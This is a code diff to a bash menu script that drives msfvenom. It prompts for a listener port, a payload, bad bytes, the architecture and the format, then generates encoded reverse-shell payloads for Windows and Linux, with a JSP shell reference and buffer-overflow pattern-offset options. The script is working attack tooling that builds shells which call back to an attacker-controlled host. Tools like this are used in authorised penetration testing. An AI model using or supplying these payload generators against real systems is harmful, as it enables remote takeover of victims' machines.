@@ -221,7 +221,7 @@ echo "2) Generate Reverse tcp Shell exe"
 echo "3) Generate CUSTOM PAYLOAD"
 echo "4) Generate CUSTOM PAYLOAD and Handler"
 echo "5) Generate Unique String of size N (Pattern_Create)" 
-echo "6) Get Pattern Offset"
+echo "6) Get Unique String Location for BOF (Pattern Offset)"
 echo "7) Search for MSF Payload"
 echo "8) Search for MSF Payload Format"
 echo ""
@@ -245,11 +245,32 @@ func_MSFVEnom_Menu
 1)
 echo "Enter Lport call home port: "
 read lport
+
+echo "Payloads Ref's:"
+echo "Linux=linux/x86/shell_reverse_tcp"
+echo "Windows=windows/shell_reverse_tcp"
+echo ""
+echo "Enter Payload Path (nc=windows/shell_reverse_tcp): "
+read payload
+
 echo "Enter byte code to exclude(ie \x00\x0a\x0d\x20): "
 read Bytesofcode
-echo "[*] Using ... msfvenom -p $payload LHOST=$LHOST LPORT=$lport -f c -a x86 --platform windows -b "$Bytesofcode" -e x86/shikata_ga_nai"
-msfvenom -p $payload LHOST=$LHOST LPORT=$lport -f c -a x86 --platform windows -b "$Bytesofcode" -e x86/shikata_ga_nai
-ifconfig tap0
+
+echo "Enter Arch type (x86 or x64):"
+read arch
+
+echo "[*] Generating List of Payload Formats...please wait for prompt"
+msfvenom -l formats
+echo "Payloads Ref's:"
+echo "Linux=-f elf"
+echo "Windows c"
+echo ""
+echo "Enter Payload format: "
+read format
+
+msfvenom -p $payload LHOST=$LHOST LPORT=$lport -f $format -a $arch --platform windows -b "$Bytesofcode" -e x86/shikata_ga_nai
+echo "[*] Using ... msfvenom -p $payload LHOST=$LHOST LPORT=$lport -f $format a $arch --platform windows -b "$Bytesofcode" -e x86/shikata_ga_nai"
+
 func_MSFVEnom_Menu
 ;;
 2)
@@ -274,20 +295,7 @@ commandlinearg+=" LPORT="$lport
 
 echo "[+] "$commandlinearg
 echo ""
-echo "Payloads Ref's:"
-echo "Linux=linux/x86/shell_reverse_tcp"
-echo "Windows=windows/shell_reverse_tcp"
-echo "Tomcat/jsp=java/jsp_shell_reverse_tcp"
-echo "JavaServerPage=LHOST LPORT -p java/jsp_shell_reverse_tcp --platform windows -o /root/MSFV_java4444.jsp"
-echo ""
-echo "Search Term to look for in Payload title: "
-read searchterm
-echo "[*] Search results below...please wait for prompt"
-msfvenom -l payloads | grep $searchterm
 
-echo "[+] "$commandlinearg
-echo "Enter Payload Path (nc=windows/shell_reverse_tcp): "
-read payload
 commandlinearg+=" -p "$payload
 
 echo "[+] "$commandlinearg
